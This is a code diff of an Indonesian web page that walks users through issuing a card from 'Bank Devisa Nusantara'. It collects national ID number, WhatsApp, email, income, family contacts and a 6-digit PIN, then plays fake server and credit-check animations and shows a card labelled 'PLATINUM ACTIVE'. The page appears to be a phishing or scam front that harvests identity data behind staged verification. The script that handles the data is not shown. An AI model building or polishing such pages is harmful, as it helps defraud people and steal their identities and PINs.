@@ -26,16 +26,31 @@
             <div class="form-content">
                 <div class="step active" id="step1">
                     <h2>01. Identitas Personal</h2>
-                    <div class="input-group"><label>Nama Lengkap</label><input type="text" id="inputNama" placeholder="Contoh: RADEN ARYA"></div>
-                    <div class="input-group"><label>NIK (16 Digit)</label><input type="tel" id="inputNIK" maxlength="16"></div>
+                    <div class="input-group">
+                        <label>Nama Lengkap (Otomatis Kapital)</label>
+                        <input type="text" id="inputNama" placeholder="CONTOH: RADEN ARYA" autocomplete="off">
+                    </div>
+                    <div class="input-group">
+                        <label>NIK (16 Digit Angka)</label>
+                        <input type="tel" id="inputNIK" maxlength="16" placeholder="Masukan 16 digit NIK">
+                    </div>
                     <button class="btn-primary" onclick="nextStep(2)">Lanjutkan</button>
                 </div>
 
                 <div class="step" id="step2">
                     <h2>02. Verifikasi Kontak</h2>
-                    <div class="input-group"><label>Nomor WhatsApp</label><input type="tel" id="inputWA" placeholder="08xxxxxxxxxx"></div>
-                    <div class="input-group"><label>Email Aktif</label><input type="email" id="inputEmail" placeholder="nama@email.com"></div>
-                    <button class="btn-primary" onclick="nextStep(3)">Verifikasi Kontak</button>
+                    <div class="input-group">
+                        <label>Nomor WhatsApp (11-13 Digit)</label>
+                        <input type="tel" id="inputWA" placeholder="08xxxxxxxxxx">
+                    </div>
+                    <div class="input-group">
+                        <label>Email Aktif</label>
+                        <input type="email" id="inputEmail" placeholder="nama@email.com">
+                    </div>
+                    <div class="nav-buttons-split">
+                        <button class="btn-alt" onclick="prevStep()">< Kembali</button>
+                        <button class="btn-primary" onclick="nextStep(3)">Lanjutkan</button>
+                    </div>
                 </div>
 
                 <div class="step" id="step3">
@@ -50,7 +65,10 @@
                         </select>
                     </div>
                     <div class="input-group"><label>Pendapatan</label><input type="tel" id="income" placeholder="Rp"></div>
-                    <button class="btn-primary" onclick="nextStep(4)">Validasi Data</button>
+                    <div class="nav-buttons-split">
+                        <button class="btn-alt" onclick="prevStep()">< Kembali</button>
+                        <button class="btn-primary" onclick="nextStep(4)">Validasi Data</button>
+                    </div>
                 </div>
 
                 <div class="step" id="step4">
@@ -62,28 +80,45 @@
                         </div>
                     </div>
                     <button type="button" class="btn-add" onclick="addEmergencyField()">+ Tambah Keluarga</button>
-                    <button class="btn-primary" onclick="nextStep(5)">Lanjutkan</button>
+                    <div class="nav-buttons-split">
+                        <button class="btn-alt" onclick="prevStep()">< Kembali</button>
+                        <button class="btn-primary" onclick="nextStep(5)">Lanjutkan</button>
+                    </div>
                 </div>
 
                 <div class="step" id="step5">
                     <h2>05. Otorisasi PIN</h2>
                     <div class="input-group"><label>6 Digit PIN</label><input type="password" id="inputPW" maxlength="6" class="pin-input"></div>
-                    <button class="btn-primary" onclick="nextStep(6)">Setel PIN</button>
+                    <div class="nav-buttons-split">
+                        <button class="btn-alt" onclick="prevStep()">< Kembali</button>
+                        <button class="btn-primary" onclick="nextStep(6)">Setel PIN</button>
+                    </div>
                 </div>
 
                 <div class="step" id="step6">
                     <h2>06. Analisis Database</h2>
-                    <div class="loading-box"><div class="spinner-large"></div><p id="slikStatus">Menghubungkan ke server...</p></div>
-                    <button class="btn-primary" id="btnSlik" style="display:none" onclick="nextStep(7)">Lihat Hasil</button>
+                    <div class="loading-box">
+                        <div class="spinner-large"></div>
+                        <p id="slikStatus">Menghubungkan ke server...</p>
+                    </div>
+                    <div id="errorActions" style="display:none; margin-top:15px;">
+                        <button class="btn-alt" onclick="prevStep()">Perbaiki Data</button>
+                    </div>
+                    <button class="btn-primary" id="btnSlik" style="display:none" onclick="nextStep(7)">Lanjutkan Ke Tahap Akhir</button>
                 </div>
 
                 <div class="step" id="step7">
-                    <h2>07. Konfirmasi</h2>
+                    <h2>07. Konfirmasi Akhir</h2>
                     <div class="agreement-box">
-                        <p>Saya setuju dengan Syarat & Ketentuan BDN.</p>
-                        <label class="check-label"><input type="checkbox" id="checkAgree"> Saya Setuju</label>
+                        <p style="font-size: 0.75rem; text-align: justify; margin-bottom: 15px;">
+                            Saya dengan ini menyatakan bertanggung jawab penuh atas kebenaran data dan penggunaan kartu ini sesuai hukum yang berlaku.
+                        </p>
+                        <label class="check-label"><input type="checkbox" id="checkAgree"> SAYA BERTANGGUNG JAWAB</label>
                     </div>
-                    <button class="btn-primary" id="btnGenerate" onclick="generateFinal()">Terbitkan Kartu</button>
+                    <div class="nav-buttons-split">
+                        <button class="btn-alt" onclick="prevStep()">< Kembali</button>
+                        <button class="btn-primary" id="btnGenerate" onclick="generateFinal()">Terbitkan Kartu</button>
+                    </div>
                 </div>
 
                 <div class="step" id="step8">
@@ -97,9 +132,9 @@
                     </div>
 
                     <div id="finalReveal" style="display:none;">
-                        <div class="reveal-text" id="rev1">PENGECEKAN SERVER... [OK]</div>
-                        <div class="reveal-text" id="rev2" style="color:#b8924e">SMART CHIP... [OK]</div>
-                        <div class="reveal-text" id="rev3" style="color:#22c55e">STATUS : AKTIF</div>
+                        <div class="reveal-text" id="rev1">SERVER VALIDATED [OK]</div>
+                        <div class="reveal-text" id="rev2" style="color:#b8924e">SMART CHIP ACTIVATED [OK]</div>
+                        <div class="reveal-text" id="rev3" style="color:#22c55e">STATUS : PLATINUM ACTIVE</div>
                         
                         <div class="card-scene">
                             <div class="card-inner" id="cardInner">
@@ -122,23 +157,18 @@
                                 <div class="card-face card-back">
                                     <div class="mag-stripe"></div>
                                     <div class="cvv-area">
-                                        <div class="cvv-white"></div>
-                                        <span class="cvv-code">810</span>
+                                        <span class="cvv-code">***</span>
                                     </div>
                                     <div class="card-terms">
-                                        Kartu ini adalah milik Bank Devisa Nusantara. Penggunaan kartu tunduk pada syarat dan ketentuan yang berlaku.
+                                        Kartu ini adalah milik Bank Devisa Nusantara. Segala bentuk penyalahgunaan akan diproses sesuai hukum negara.
                                     </div>
                                 </div>
                             </div>
                         </div>
 
                         <div class="button-group-final">
-                            <button class="btn-primary btn-save" id="btnDownload" onclick="takeScreenshot()">
-                                📸 SIMPAN GAMBAR KARTU
-                            </button>
-                            <button class="btn-flip" id="btnFlip" onclick="toggleFlip()">
-                                🔄 PUTAR KARTU
-                            </button>
+                            <button class="btn-primary btn-save" id="btnDownload" onclick="takeScreenshot()">📸 SIMPAN GAMBAR KARTU</button>
+                            <button class="btn-flip" onclick="toggleFlip()">🔄 PUTAR KARTU</button>
                         </div>
                     </div>
                 </div>
@@ -147,12 +177,5 @@
     </main>
 
     <script type="module" src="script.js"></script>
-    <script>
-        // Global flip function for onclick
-        window.toggleFlip = () => {
-            const card = document.getElementById('cardInner');
-            if(card) card.classList.toggle('is-flipped');
-        };
-    </script>
 </body>
 </html>
